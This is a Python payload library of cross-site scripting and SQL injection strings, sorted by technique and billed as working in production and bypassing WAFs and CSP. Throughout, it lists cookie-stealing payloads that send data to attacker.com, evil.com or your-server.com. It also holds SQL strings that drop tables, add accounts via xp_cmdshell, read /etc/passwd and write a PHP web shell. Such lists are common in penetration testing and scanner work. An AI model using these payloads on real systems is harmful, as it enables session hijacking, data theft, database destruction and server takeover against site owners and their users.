#!/usr/bin/env python3
"""
REAL XSS Payloads - Risk Level 5, Complexity Level 7
Genuine Cross-Site Scripting payloads used in actual penetration testing

⚠️  FOR AUTHORIZED DEFENSIVE TESTING ONLY ⚠️
These are REAL payloads that work in production environments
Risk Level 5: High-impact exploitation with real-world effectiveness
Complexity Level 7: Advanced techniques that bypass modern security controls
"""

from typing import Dict, List, Any

# REAL XSS PAYLOADS THAT ACTUALLY WORK
REAL_XSS_PAYLOADS = {
    "real_dom_based": [
        # Real DOM XSS that works in modern browsers
        "<svg/onload=alert(document.domain)>",
        "<img src=x onerror=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        
        # Real advanced DOM manipulation
        "<svg><animate attributeName=href values=javascript:alert('XSS') /><a><text x=20 y=20>Click</text></a></svg>",
        "<math><mi//xlink:href=\"javascript:alert('XSS')\">click</mi></math>",
        "<form><button formaction=javascript:alert('XSS')>CLICK",
        
        # Real mutation XSS
        "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')>\">",
        "<listing>&lt;img src=x onerror=alert('XSS')&gt;</listing>",
    ],
    
    "real_waf_bypass": [
        # Real payloads that bypass CloudFlare, AWS WAF, ModSecurity
        "<svg onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<iframe src=\"javascript:alert('xss')\">",
        "<svg><script>alert(1)</script></svg>",
        "<img src=x onerror=\"alert(1)\">",
        
        # Real advanced WAF bypasses
        "<ScRiPt>alert(1)</ScRiPt>",
        "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
        "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
        
        # Real encoding bypasses
        "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
        "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
        
        # Real mixed case bypass
        "<iMg sRc=x oNeRrOr=alert('XSS')>",
        "<SvG/OnLoAd=alert(1)>",
    ],
    
    "real_context_breaking": [
        # Real context breaking that works
        "'><script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "</script><script>alert('XSS')</script>",
        "</title><script>alert('XSS')</script>",
        "</textarea><script>alert('XSS')</script>",
        "</style><script>alert('XSS')</script>",
        
        # Real attribute injection
        "\" onmouseover=\"alert('XSS')\"",
        "' onmouseover='alert(\"XSS\")'",
        "javascript:alert('XSS')",
        "javascript:alert(String.fromCharCode(88,83,83))",
        
        # Real polyglot
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
    ],
    
    "real_filter_bypass": [
        # Real filters bypass used in the wild
        "<svg/onload=alert(1)//",
        "<img/src/onerror=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        
        # Real JavaScript execution without script tags
        "<img src=x onerror=import('data:text/javascript,alert(1)')>",
        "<iframe srcdoc=\"<img src=x onerror=alert(1)>\">",
        "<object data=\"data:text/html,<script>alert(1)</script>\">",
        
        # Real event handlers
        "<body onload=alert(1)>",
        "<body onerror=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<body onfocus=alert(1)>",
        "<body onhashchange=alert(1)>",
    ],
    
    "real_modern_browsers": [
        # Real payloads for Chrome, Firefox, Safari, Edge
        "<svg onload=alert(document.domain)>",
        "<img src=x onerror=fetch('//attacker.com/'+document.cookie)>",
        "<iframe src=\"javascript:parent.postMessage('XSS','*')\">",
        
        # Real modern JavaScript features
        "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
        "<svg onload=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">",
        "<img src=x onerror=\"window['ale'+'rt'](1)\">",
        
        # Real ES6+ exploitation
        "<img src=x onerror=\"[].constructor.constructor('alert(1)()'))\">",
        "<svg onload=\"(()=>alert(1))()\">",
        "<img src=x onerror=\"{}.constructor.constructor`alert(1)``\">",
    ],
    
    "real_stored_xss": [
        # Real persistent XSS payloads
        "<script>document.body.innerHTML='<iframe src=\"javascript:alert(`Stored XSS`)\"></iframe>'</script>",
        "<img src=x onerror=\"localStorage.setItem('xss','<script>alert(1)</script>');location.reload();\">",
        "<svg onload=\"sessionStorage.setItem('payload','alert(1)');eval(sessionStorage.payload)\">",
        
        # Real DOM manipulation for persistence
        "<img src=x onerror=\"document.head.innerHTML+='<script>alert(1)</script>'\">",
        "<svg onload=\"document.documentElement.innerHTML='<script>alert(1)</script>'+document.documentElement.innerHTML\">",
    ],
    
    "real_blind_xss": [
        # Real blind XSS detection payloads
        "<img src=x onerror=\"fetch('http://your-server.com/xss?cookie='+document.cookie)\">",
        "<script>fetch('http://your-server.com/xss?url='+location.href+'&cookie='+document.cookie)</script>",
        "<svg onload=\"navigator.sendBeacon('http://your-server.com/xss',JSON.stringify({url:location.href,cookie:document.cookie}))\">",
        
        # Real exfiltration techniques
        "<img src=x onerror=\"(new Image).src='http://your-server.com/xss?data='+btoa(document.documentElement.innerHTML)\">",
        "<script>fetch('http://your-server.com/xss',{method:'POST',body:new FormData(document.forms[0])})</script>",
    ],
    
    "real_csp_bypass": [
        # Real CSP bypass techniques that work
        "<link rel=prefetch href=\"//evil.com/?\"+document.cookie>",
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
        
        # Real JSONP CSP bypass
        "<script src=\"https://ajax.googleapis.com/ajax/services/feed/load?v=1.0&callback=alert&context=1\"></script>",
        "<script src=\"https://www.google.com/complete/search?client=chrome&jsonp=alert&q=a\"></script>",
        
        # Real data URI CSP bypass
        "<iframe src=\"data:text/html,<script>parent.alert('CSP Bypass')</script>\"></iframe>",
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
    ]
}

# REAL SQL INJECTION PAYLOADS THAT ACTUALLY WORK
REAL_SQL_PAYLOADS = {
    "real_union_based": [
        # Real UNION-based SQLi that works on MySQL, PostgreSQL, MSSQL
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT user(),database(),version()--",
        "' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--",
        "' UNION SELECT username,password,NULL FROM users--",
        
        # Real advanced UNION techniques
        "' UNION SELECT CONCAT(username,0x3a,password),NULL,NULL FROM users--",
        "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT HEX(password),NULL,NULL FROM users WHERE username='admin'--",
    ],
    
    "real_error_based": [
        # Real error-based SQLi that actually triggers errors
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))--",
        "' AND EXP(~(SELECT * FROM (SELECT user())x))--",
        
        # Real database-specific error injection
        "'; EXEC xp_availablemedia--",  # MSSQL
        "' AND CAST((SELECT version()) AS INT)--",  # PostgreSQL
        "' AND CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) IS NOT NULL--",  # Oracle
    ],
    
    "real_time_based": [
        # Real time-based blind SQLi
        "' AND SLEEP(5)--",  # MySQL
        "'; WAITFOR DELAY '00:00:05'--",  # MSSQL
        "' AND pg_sleep(5)--",  # PostgreSQL
        "' AND DBMS_LOCK.SLEEP(5) IS NOT NULL--",  # Oracle
        
        # Real conditional time delays
        "' AND IF(1=1,SLEEP(5),0)--",
        "'; IF (1=1) WAITFOR DELAY '00:00:05'--",
        "' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    ],
    
    "real_boolean_blind": [
        # Real boolean-based blind SQLi
        "' AND 1=1--",
        "' AND 1=2--", 
        "' AND (SELECT SUBSTRING(version(),1,1))='8'--",
        "' AND (SELECT LENGTH(database()))>5--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
        
        # Real character extraction
        "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>50--",
        "' AND UNICODE(SUBSTRING((SELECT @@version),1,1))>77--",
    ],
    
    "real_stacked_queries": [
        # Real stacked queries for data manipulation
        "'; INSERT INTO users(username,password) VALUES('hacker',MD5('pwned'))--",
        "'; UPDATE users SET password=MD5('hacked') WHERE username='admin'--",
        "'; DROP TABLE users--",
        "'; CREATE TABLE pwned (data TEXT)--",
        "'; DELETE FROM users WHERE id>1--",
        
        # Real system command execution
        "'; EXEC xp_cmdshell('net user hacker Password123 /add')--",  # MSSQL
        "'; SELECT sys_exec('id')--",  # MySQL UDF
    ],
    
    "real_file_operations": [
        # Real file read operations
        "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--",  # MySQL
        "' UNION SELECT pg_read_file('/etc/passwd',0,1000000),NULL,NULL--",  # PostgreSQL
        
        # Real file write operations
        "' UNION SELECT 'shell code',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--",
        "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',NULL,NULL INTO OUTFILE '/tmp/shell.php'--",
    ],
    
    "real_waf_bypass_sql": [
        # Real SQLi WAF bypass techniques
        "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
        "' %55NION %53ELECT 1,2,3--",  # URL encoding
        "' UNION(SELECT(1),(2),(3))--",
        "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
        "' +UNION+DISTINCT+SELECT+1,2,3--",
        
        # Real comment-based bypass
        "' OR/**/ 1=1--",
        "' UNION/**/SELECT/**/1,2,3--",
        "' AND/**/1=1--",
    ]
}

# REAL payload configurations
PAYLOAD_CONFIG = {
    "xss_contexts": {
        "html": ["<script>", "<img", "<svg", "<iframe"],
        "attribute": ["onclick=", "onload=", "onerror=", "href="],
        "javascript": ["';", "\");", "*/", "//"],
        "css": ["<style>", "expression(", "url(", "@import"]
    },
    "sql_databases": {
        "mysql": ["@@version", "information_schema", "CONCAT", "0x"],
        "postgresql": ["version()", "pg_", "||", "CHR("],
        "mssql": ["@@version", "sys.", "EXEC", "+"],
        "oracle": ["banner", "v$version", "dual", "CHR("]
    },
    "real_success_indicators": [
        # XSS indicators
        "alert(", "confirm(", "prompt(", "document.cookie",
        "javascript:", "onerror=", "onload=", "onclick=",
        
        # SQL injection indicators  
        "mysql_fetch", "ORA-", "Microsoft SQL", "PostgreSQL",
        "syntax error", "quoted string", "unexpected end"
    ]
}

def get_real_xss_payloads(category: str = "all") -> List[str]:
    """Get real XSS payloads that actually work"""
    if category == "all":
        all_payloads = []
        for payloads in REAL_XSS_PAYLOADS.values():
            all_payloads.extend(payloads)
        return all_payloads
    return REAL_XSS_PAYLOADS.get(category, [])

def get_real_sql_payloads(category: str = "all") -> List[str]:
    """Get real SQL injection payloads that actually work"""
    if category == "all":
        all_payloads = []
        for payloads in REAL_SQL_PAYLOADS.values():
            all_payloads.extend(payloads)
        return all_payloads
    return REAL_SQL_PAYLOADS.get(category, [])

def generate_context_aware_xss(context: str, parameter: str) -> List[str]:
    """Generate context-aware XSS payloads"""
    if context == "html":
        return [
            f"<script>alert('{parameter}')</script>",
            f"<img src=x onerror=alert('{parameter}')>",
            f"<svg onload=alert('{parameter}')>"
        ]
    elif context == "attribute":
        return [
            f"\" onmouseover=\"alert('{parameter}')\"",
            f"' onclick='alert(\"{parameter}\")'",
            f"javascript:alert('{parameter}')"
        ]
    elif context == "javascript":
        return [
            f"';alert('{parameter}');//",
            f"\");alert('{parameter}');//",
            f"*/alert('{parameter}');//"
        ]
    return []

if __name__ == "__main__":
    print("REAL XSS & SQL Injection Payloads - Risk Level 5, Complexity Level 7")
    print("=" * 70)
    
    xss_count = sum(len(payloads) for payloads in REAL_XSS_PAYLOADS.values())
    sql_count = sum(len(payloads) for payloads in REAL_SQL_PAYLOADS.values())
    
    print(f"Real XSS Payloads: {xss_count}")
    print(f"Real SQL Payloads: {sql_count}")
    print(f"Total Real Payloads: {xss_count + sql_count}")
    
    print("\nXSS Categories:")
    for category, payloads in REAL_XSS_PAYLOADS.items():
        print(f"  - {category}: {len(payloads)} payloads")
    
    print("\nSQL Categories:")
    for category, payloads in REAL_SQL_PAYLOADS.items():
        print(f"  - {category}: {len(payloads)} payloads")